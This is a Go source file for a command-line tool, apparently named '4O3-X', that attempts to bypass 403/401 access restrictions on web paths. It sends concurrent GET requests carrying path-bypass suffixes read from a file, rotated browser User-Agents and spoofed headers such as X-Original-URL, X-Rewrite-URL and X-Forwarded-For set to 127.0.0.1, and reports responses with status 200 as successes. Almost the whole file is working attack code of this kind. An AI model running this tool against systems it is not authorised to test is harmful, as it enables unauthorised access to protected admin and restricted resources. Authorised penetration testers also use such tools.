package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/fatih/color"
	"golang.org/x/time/rate"
)

const banner = `
_____ ________________     ____  __
__  // /_  __ \_|__  /     __  |/ /
_  // /_  / / /__/_ <________    / 
/__  __/ /_/ /____/ //_____/    |  
  /_/  \____/ /____/       /_/|_|  
                                   
by Whoamikiddie
`

// Config holds the application configuration
type Config struct {
	Path      string
	Domains   string
	Target    string
	Workers   int
	Timeout   time.Duration
	Verbose   bool
	RateLimit float64
}

// Stats tracks the application statistics
type Stats struct {
	processed uint64
	skipped   uint64
}

// HeaderGenerator interface for generating HTTP headers
type HeaderGenerator interface {
	Generate(path string) []map[string]string
}

// DefaultHeaderGenerator implements HeaderGenerator
type DefaultHeaderGenerator struct {
	userAgents []string
}

// NewDefaultHeaderGenerator creates a new header generator
func NewDefaultHeaderGenerator() *DefaultHeaderGenerator {
	return &DefaultHeaderGenerator{
		userAgents: []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
			"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
		},
	}
}

func (g *DefaultHeaderGenerator) randomUserAgent() string {
	return g.userAgents[rand.Intn(len(g.userAgents))]
}

func (g *DefaultHeaderGenerator) Generate(path string) []map[string]string {
	if path == "" {
		path = "/"
	}

	headers := []map[string]string{
		{"User-Agent": g.randomUserAgent()},
		{"User-Agent": g.randomUserAgent(), "X-Original-URL": path},
		{"User-Agent": g.randomUserAgent(), "X-Custom-IP-Authorization": "127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "X-Forwarded-For": "http://127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "X-Forwarded-For": "127.0.0.1:80"},
		{"User-Agent": g.randomUserAgent(), "X-Originally-Forwarded-For": "127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "X-Originating-": "http://127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "X-Originating-IP": "127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "True-Client-IP": "127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "X-WAP-Profile": "127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "X-Arbitrary": "http://127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "X-HTTP-DestinationURL": "http://127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "X-Forwarded-Proto": "http://127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "Destination": "127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "X-Remote-IP": "127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "X-Client-IP": "http://127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "X-Host": "http://127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "X-Forwarded-Host": "http://127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "X-ProxyUser-Ip": "127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "X-rewrite-url": path},
		{"User-Agent": g.randomUserAgent(), "X-Real-IP": "127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "CF-Connecting-IP": "127.0.0.1"},
		{"User-Agent": g.randomUserAgent(), "Forwarded": "for=127.0.0.1;proto=http;by=127.0.0.1"},
	}

	// Add port-based headers
	ports := []string{"443", "80", "8080", "8443", "3128"}
	for _, port := range ports {
		headers = append(headers, map[string]string{
			"User-Agent":        g.randomUserAgent(),
			"X-Forwarded-Port": port,
		})
	}

	return headers
}

// Scanner handles file reading operations
type Scanner struct {
	verbose bool
}

func NewScanner(verbose bool) *Scanner {
	return &Scanner{verbose: verbose}
}

func (s *Scanner) readLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to open file '%s': %v", filename, err)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading file '%s': %v", filename, err)
	}
	return lines, nil
}

// Requester handles HTTP requests
type Requester struct {
	client    *http.Client
	limiter   *rate.Limiter
	verbose   bool
	stats     *Stats
	seenInvalid sync.Map
}

func NewRequester(timeout time.Duration, rateLimit float64, verbose bool, stats *Stats) *Requester {
	return &Requester{
		client: &http.Client{
			Timeout: timeout,
		},
		limiter: rate.NewLimiter(rate.Limit(rateLimit), 1),
		verbose: verbose,
		stats:   stats,
	}
}

func (r *Requester) doRequest(ctx context.Context, urlStr string, headers map[string]string) {
	if err := r.limiter.Wait(ctx); err != nil {
		return // Context cancelled
	}

	req, err := http.NewRequestWithContext(ctx, "GET", urlStr, nil)
	if err != nil {
		r.logError(fmt.Sprintf("Failed to create request for %s: %v", urlStr, err))
		return
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := r.client.Do(req)
	if err != nil {
		if r.verbose {
			r.logError(fmt.Sprintf("Network error for %s: %v", urlStr, err))
		}
		return
	}
	defer resp.Body.Close()

	lastHeader := ""
	for k, v := range headers {
		if k != "User-Agent" {
			lastHeader = fmt.Sprintf("%s: %s", k, v)
			break
		}
	}

	switch resp.StatusCode {
	case 200:
		color.Green("[SUCCESS] %s %s [%d]", urlStr, lastHeader, resp.StatusCode)
	case 403, 401:
		color.Yellow("[CHECK] %s %s [%d]", urlStr, lastHeader, resp.StatusCode)
	default:
		color.Red("[FAIL] %s %s [%d]", urlStr, lastHeader, resp.StatusCode)
	}
}

func (r *Requester) logError(message string) {
	if r.verbose {
		color.Red("[ERROR] %s", message)
	}
}

func (r *Requester) validateURL(urlStr string) error {
	parsedURL, err := url.ParseRequestURI(urlStr)
	if err != nil {
		return fmt.Errorf("invalid URL: %v", err)
	}
	if parsedURL.Scheme == "" || parsedURL.Host == "" {
		return fmt.Errorf("missing scheme or host")
	}
	if strings.ContainsAny(urlStr, " \t\n\r") {
		return fmt.Errorf("contains invalid whitespace characters")
	}
	return nil
}

// Worker represents a single worker processing URLs
type Worker struct {
	requester *Requester
	headers   []map[string]string
}

func NewWorker(requester *Requester, headers []map[string]string) *Worker {
	return &Worker{
		requester: requester,
		headers:   headers,
	}
}

func (w *Worker) process(ctx context.Context, jobs <-chan string) {
	for urlStr := range jobs {
		select {
		case <-ctx.Done():
			return
		default:
			for _, headers := range w.headers {
				w.requester.doRequest(ctx, urlStr, headers)
			}
		}
	}
}

// constructURL builds the full URL with bypass
func constructURL(base, path, bypass string) string {
	if path != "" {
		return fmt.Sprintf("%s/%s%s", base, path, bypass)
	}
	return base + bypass
}

func run(cfg *Config) error {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	stats := &Stats{}
	scanner := NewScanner(cfg.Verbose)
	requester := NewRequester(cfg.Timeout, cfg.RateLimit, cfg.Verbose, stats)
	headerGen := NewDefaultHeaderGenerator()

	// Load bypasses
	bypasses, err := scanner.readLines("bypasses.txt")
	if err != nil {
		return fmt.Errorf("error loading bypasses.txt: %v", err)
	}
	if len(bypasses) == 0 {
		return fmt.Errorf("no valid bypasses found in bypasses.txt")
	}

	headers := headerGen.Generate(cfg.Path)
	jobs := make(chan string, cfg.Workers*2)

	var wg sync.WaitGroup
	for i := 0; i < cfg.Workers; i++ {
		wg.Add(1)
		worker := NewWorker(requester, headers)
		go func() {
			defer wg.Done()
			worker.process(ctx, jobs)
		}()
	}

	// Process domains file if specified
	if cfg.Domains != "" {
		color.Cyan("Checking domains from %s...", cfg.Domains)
		domains, err := scanner.readLines(cfg.Domains)
		if err != nil {
			return fmt.Errorf("error loading domains file: %v", err)
		}
		if len(domains) == 0 {
			return fmt.Errorf("no valid domains found in %s", cfg.Domains)
		}

		for _, domain := range domains {
			for _, bypass := range bypasses {
				urlStr := constructURL(domain, cfg.Path, bypass)
				if err := requester.validateURL(urlStr); err != nil {
					atomic.AddUint64(&stats.skipped, 1)
					continue
				}
				atomic.AddUint64(&stats.processed, 1)
				jobs <- urlStr
			}
		}
	}

	// Process single target if specified
	if cfg.Target != "" {
		color.Cyan("Checking target %s...", cfg.Target)
		for _, bypass := range bypasses {
			urlStr := constructURL(cfg.Target, cfg.Path, bypass)
			if err := requester.validateURL(urlStr); err != nil {
				atomic.AddUint64(&stats.skipped, 1)
				continue
			}
			atomic.AddUint64(&stats.processed, 1)
			jobs <- urlStr
		}
	}

	close(jobs)
	wg.Wait()

	color.Cyan("Summary: Processed %d URLs, Skipped %d invalid URLs",
		atomic.LoadUint64(&stats.processed),
		atomic.LoadUint64(&stats.skipped))

	return nil
}

func main() {
	rand.Seed(time.Now().UnixNano())
	color.New(color.FgHiMagenta).Println(banner)

	cfg := &Config{}
	flag.StringVar(&cfg.Path, "p", "", "Path to check (e.g., admin)")
	flag.StringVar(&cfg.Domains, "d", "", "File with domains to check (e.g., domains.txt)")
	flag.StringVar(&cfg.Target, "t", "", "Single domain to check (e.g., http://example.com)")
	flag.IntVar(&cfg.Workers, "w", 10, "Number of concurrent workers")
	flag.DurationVar(&cfg.Timeout, "timeout", 10*time.Second, "HTTP request timeout (e.g., 5s)")
	flag.BoolVar(&cfg.Verbose, "v", false, "Verbose mode to show detailed errors")
	flag.Float64Var(&cfg.RateLimit, "rate", 10.0, "Number of requests per second")
	flag.Parse()

	if cfg.Domains == "" && cfg.Target == "" {
		color.Red("Error: You must specify either -d (domains file) or -t (target)")
		flag.Usage()
		os.Exit(1)
	}

	if err := run(cfg); err != nil {
		color.Red("Error: %v", err)
		os.Exit(1)
	}
}
